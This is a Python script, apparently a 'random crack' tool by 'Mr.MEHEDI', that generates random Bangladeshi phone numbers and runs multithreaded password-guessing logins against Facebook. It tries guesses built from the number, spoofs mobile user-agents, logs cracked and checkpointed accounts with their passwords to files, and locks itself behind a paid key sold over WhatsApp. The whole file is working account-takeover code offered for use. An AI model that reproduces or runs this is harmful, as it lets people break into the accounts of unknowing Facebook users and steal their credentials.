import os,time,sys
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
logo = """
    __  ___________  ____________  ____                       /  |/  / ____/ / / / ____/ __ \/  _/                      / /|_/ / __/ / /_/ / __/ / / / // /                       / /  / / /___/ __  / /___/ /_/ // /                       /_/  /_/_____/_/ /_/_____/_____/___/                       ==============================================             ───➤  OWNER          :  Mr.MEHEDI                          ───➤  FACEBOOK       :  MD MEHEDI HASAN                    ───➤  GITHUB         :  R1F10-56-790                       ───➤  TOOLS          :  RANDOM                             ==============================================
"""
ok = []
cp = []
id = []
session = requests.Session()
user = []
loop = 0
oks = []
cps = []
loop = 0
ugen=[]
for ua in range(1000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['12' , '13' , '14' , '15'])
      c='SM-A125U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,100)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
def Main():
	os.system('clear')
	print(logo)
	print("<> BD SIM CODE : [017 018 019 013 015 016] ")
	love = input('<> SELECT : ')
	print('<> EXAMPLE : [1000,5000,10000,15000,20000] ')
	limit = int(input('<> LIMIT : '))
	for nmbr in range(limit):
		lova = ''.join(random.choice(string.digits) for _ in range(2))
		lovb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=60) as turag:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('<> CHOICE CODE : '+love)
		print('<> TOTAL ID   :  '+tl)
		print('<> CRACK STARTED....... ')
		print(50*'━')
		for guru in user:
			uid = love+lova+lovb+guru
			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
			turag.submit(test,uid,pwx,tl)
	print(50*'━')
	print(' <> CRACK DONE......... ')
	print(50*'━')
	exit()
def test(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mMehedi-King\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'www.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=s5CiZXOknz3JmKRwHAjMpwrG; datr=vpCiZTajL3ZcZyUo_sdFwVCp; wd=891x1654; fr=0y4maVy9Sg22L2KFo..BlopC-.N4.AAA.0.0.BlopR4.AWWkmoMn8c8; dpr=2.1988937854766846',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'viewport-width': '980',}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m[Mehedi-King-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                oks.append(cid)
                open('/sdcard/Mehedi-King-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\r\33[1;92m[Mehedi-King-CP] {uid} ¤ {ps}")
                open('/sdcard/Mehedi-King-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1        
    except:
        pass
def superuser():
    UMO="Mehedi"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "11".join(uuid)
    print(logo)
    Mehedi=requests.get("https://github.com/mehedihasan21sgs/Mehedi-Hasan-/blob/main/Mehedi").text
    if id in Mehedi:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https:/https://www.facebook.com//profile.php?id=100042455521166")
        time.sleep(3.0)
        
        os.system("clear")  
        print(logo)      
        print("\t\033[30m      [\033[1;32m\033[ First Get Approvel\033[00m\033[1;30m]")
        print ("")
        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
        print ("")
        print("                Your Key is Not Approved ")
        print("               Copy And Send Key To Admin")
        print ("")
        print (" Your Key : "+UMO+id)
        print ("\n")
        os.system("espeak \"assalamualaikum , TOOLS IS MR.MEHEDI FREE TOOLS\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://wa.me/+8801963728400")
        superuser()               
superuser()
#-----------Code Stop------------#

Main()